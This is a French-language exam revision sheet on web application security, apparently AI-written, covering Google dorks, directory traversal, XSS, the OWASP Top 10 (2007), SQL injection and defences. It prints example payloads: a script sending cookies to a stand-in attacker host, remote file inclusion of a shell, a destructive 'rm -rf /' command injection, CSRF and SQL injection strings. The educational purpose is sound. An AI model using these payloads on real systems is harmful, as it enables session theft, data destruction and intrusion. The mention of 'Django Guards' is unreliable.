Voici un résumé **approfondi et structuré** des documents pour vous préparer à votre examen, en français :

---

### **1. Parcours de répertoires / Google Dorks**  
#### **Recherche avancée avec Google Dorks** :  
- **Opérateurs clés** :  
  - `intitle:"index of"` : Recherche des pages listant des fichiers (ex. : logs, backups).  
  - `filetype:pdf` ou `filetype:xls` : Cible des documents spécifiques.  
  - `site:exemple.com` : Limite les résultats à un domaine.  
  - `inurl:iisstart.htm` : Identifie les serveurs IIS.  
  - `cache:exemple.com` : Affiche la version mise en cache d’une page.  
- **Exemples pratiques** :  
  - Recherche de fichiers sensibles : `"password" filetype:xls site:tek-up.de`.  
  - Détection de serveurs mal configurés : `intitle:"index of" server:Apache/2.2.34`.  

#### **Parcours de répertoires (Directory Traversal)** :  
- **Technique** : Utilise `../` pour accéder à des fichiers hors du répertoire web racine (ex. : `../../../../etc/passwd`).  
- **Exploitation** :  
  - Lire des fichiers système (logs, configurations).  
  - Exécuter des commandes via des scripts vulnérables.  
- **Prévention** :  
  - Valider les chemins d’accès.  
  - Utiliser des fonctions sécurisées (ex. : `realpath()` en PHP).  

---

### **2. Failles XSS (Cross-Site Scripting)**  
#### **Types d’attaques** :  
1. **XSS réfléchi (Reflected XSS)** :  
   - Le code malveillant est injecté via une URL et exécuté immédiatement (ex. : formulaire de recherche non filtré).  
   - **Exemple** : `https://victime.com/recherche?q=<script>alert('xss')</script>`.  
   - **Conséquence** : Vol de cookies de session via un lien trompeur.  

2. **XSS stocké (Stored XSS)** :  
   - Le code est enregistré dans une base de données (ex. : forum, commentaires).  
   - **Exemple** : Un message contenant `<img src=x onerror="voler_cookie()">` s’exécute à chaque consultation.  
   - **Conséquence** : Attaque persistante affectant tous les utilisateurs.  

3. **XSS basé sur le DOM (DOM-based XSS)** :  
   - Exploite des vulnérabilités dans le code JavaScript côté client (ex. : modification du `document.location`).  

#### **Exploitation pratique** :  
- **Vol de cookies** :  
  ```javascript
  <script>
    document.location = "http://attaquant.com/steal?cookie=" + document.cookie;
  </script>
  ```  
- **Redirection vers un site malveillant** :  
  ```javascript
  window.location.href = "http://phishing.com";
  ```  

#### **Prévention** :  
- **Validation des entrées** : Bloquer les caractères spéciaux (`<`, `>`, `"`).  
- **Encodage des sorties** :  
  - HTML : `htmlspecialchars()` en PHP.  
  - JavaScript : `Encoder.encodeForJavaScript()`.  
- **En-têtes de sécurité** :  
  - `Content-Security-Policy` (CSP) pour interdire l’exécution de scripts externes.  
  - `HttpOnly` pour protéger les cookies.  

---

### **3. OWASP Top 10 (Édition 2007)**  
#### **A1 – Cross-Site Scripting (XSS)**  
- **Impact** : Vol de données, usurpation d’identité, attaques CSRF.  
- **Prévention** : Encodage des sorties, CSP, validation stricte des entrées.  

#### **A2 – Failles d’injection (SQLi, OS Command Injection)**  
- **SQL Injection** :  
  - **Union-based** : `UNION SELECT username, password FROM users --`.  
  - **Blind SQLi** : Inférence via des réponses booléennes (ex. : `IF(1=1) WAITFOR DELAY '0:0:5'`).  
  - **Prévention** : Requêtes préparées (ex. : `PreparedStatement` en Java), désactiver les messages d’erreur détaillés.  

- **Command Injection** :  
  - Exploite des fonctions système (ex. : `exec()` en PHP).  
  - **Exemple** : `ping 127.0.0.1; rm -rf /`.  
  - **Prévention** : Valider les entrées, utiliser des bibliothèques sécurisées.  

#### **A3 – Exécution de fichiers malveillants (File Inclusion)**  
- **Local File Inclusion (LFI)** :  
  - Exploite des paramètres vulnérables (ex. : `?page=../../etc/passwd`).  
- **Remote File Inclusion (RFI)** :  
  - Charge des scripts externes (ex. : `?page=http://attaquant.com/shell.txt`).  
- **Prévention** : Désactiver `allow_url_include` en PHP, utiliser des chemins statiques.  

#### **A4 – Référence directe non sécurisée à un objet (IDOR)**  
- **Exemple** : Accès à des ressources via des IDs prévisibles (ex. : `file=1`, `file=2`).  
- **Prévention** : Vérifier les autorisations de l’utilisateur, utiliser des identifiants aléatoires (UUID).  

#### **A5 – Cross-Site Request Forgery (CSRF)**  
- **Attaque** : Forcer un utilisateur à effectuer une action sans son consentement (ex. : formulaire caché).  
- **Exemple** :  
  ```html
  <img src="https://banque.com/virement?to=attaquant&montant=1000" width="0" height="0">
  ```  
- **Prévention** : Jetons CSRF (`token` unique par session), vérifier l’en-tête `Referer`.  

#### **A6 – Fuites d’information**  
- **Risques** : Messages d’erreur détaillés révélant des chemins ou versions de serveurs.  
- **Prévention** : Afficher des erreurs génériques (ex. : "Erreur interne du serveur").  

#### **A7 – Violation de gestion d’authentification**  
- **Problèmes** : Sessions non renouvelées après connexion, stockage de mots de passe en clair.  
- **Solutions** :  
  - Utiliser `bcrypt` ou `Argon2` pour le hachage.  
  - Regénérer les identifiants de session après authentification.  

#### **A8 – Stockage cryptographique non sécurisé**  
- **Exemples** :  
  - Stockage de CVV de cartes bancaires.  
  - Chiffrement faible (ex. : MD5 pour les mots de passe).  
- **Bonnes pratiques** :  
  - Chiffrement AES-256 pour les données sensibles.  
  - Respecter les normes PCI DSS pour les paiements.  

#### **A9 – Communications non sécurisées**  
- **Risques** : Données transmises en clair via HTTP.  
- **Prévention** :  
  - Forcer l’utilisation de HTTPS.  
  - Configurer HSTS (HTTP Strict Transport Security).  

#### **A10 – Défaillance dans la restriction des accès URL**  
- **Exemple** : Accès à des pages admin sans vérification des rôles.  
- **Prévention** :  
  - Contrôler les autorisations à chaque niveau (client et serveur).  
  - Utiliser des frameworks de sécurité (ex. : Spring Security, Django Guards).  

---

### **4. Injection SQL (SQLi)**  
#### **Techniques d’exploitation** :  
- **Union-based SQLi** :  
  - `UNION SELECT null, username, password FROM users --`.  
- **Error-based SQLi** :  
  - Exploiter les erreurs SQL pour récupérer des données (ex. : `AND 1=CONVERT(int, (SELECT @@version))`).  
- **Blind SQLi** :  
  - Inférence via des délais ou des réponses booléennes (ex. : `IF(SUBSTRING(@@version,1,1)='5') WAITFOR DELAY '0:0:5'`).  

#### **Outils** :  
- **SQLMap** : Automatise la détection et l’exploitation des vulnérabilités.  

#### **Prévention** :  
- **Requêtes préparées** :  
  - Java : `PreparedStatement`.  
  - PHP : `PDO` avec `bindParam()`.  
- **Filtrage des entrées** : Bloquer les mots-clés SQL (ex. : `DROP`, `UNION`).  

---

### **5. Bonnes pratiques générales**  
1. **Validation des entrées** :  
   - Bloquer les caractères spéciaux (ex. : `<`, `>`, `'`).  
   - Utiliser des regex pour valider les formats (emails, numéros).  
2. **Encodage des sorties** :  
   - HTML : `htmlspecialchars()` en PHP.  
   - JavaScript : `encodeURI()`.  
3. **Mises à jour** :  
   - Maintenir les CMS, frameworks et dépendances à jour.  
4. **Tests de sécurité** :  
   - Utiliser **BurpSuite** pour tester les vulnérabilités.  
   - Simuler des attaques sur des plateformes comme **Mutillidae**.  

---

Bonne chance pour votre examen ! 🚀  
N’hésitez pas à réviser en pratiquant des scénarios réels (ex. : CTFs, labs OWASP).
